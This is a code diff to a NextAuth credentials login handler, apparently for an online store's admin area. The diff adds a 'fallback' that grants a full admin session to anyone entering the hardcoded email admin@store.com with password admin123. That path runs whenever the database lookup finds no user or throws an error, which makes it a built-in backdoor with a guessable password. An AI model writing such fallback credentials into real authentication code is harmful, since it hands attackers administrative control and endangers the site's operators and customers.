@@ -25,31 +25,42 @@ export const authOptions: NextAuthOptions = {
             role: "admin",
           });
 
-          if (!user) {
-            return null;
+          if (user) {
+            const isPasswordValid = await user.comparePassword(
+              credentials.password,
+            );
+
+            if (!isPasswordValid) {
+              return null;
+            }
+
+            await User.findByIdAndUpdate(user._id, { lastLogin: new Date() });
+
+            return {
+              id: user._id.toString(),
+              email: user.email,
+              name: user.name,
+              role: user.role,
+            };
           }
-
-          const isPasswordValid = await user.comparePassword(
-            credentials.password,
-          );
-
-          if (!isPasswordValid) {
-            return null;
-          }
-
-          // Update last login
-          await User.findByIdAndUpdate(user._id, { lastLogin: new Date() });
-
-          return {
-            id: user._id.toString(),
-            email: user.email,
-            name: user.name,
-            role: user.role,
-          };
         } catch (error) {
           console.error("Authentication error:", error);
-          return null;
         }
+
+        // Fallback static admin credentials
+        if (
+          credentials.email === "admin@store.com" &&
+          credentials.password === "admin123"
+        ) {
+          return {
+            id: "static-admin",
+            email: "admin@store.com",
+            name: "Admin",
+            role: "admin",
+          };
+        }
+
+        return null;
       },
     }),
   ],
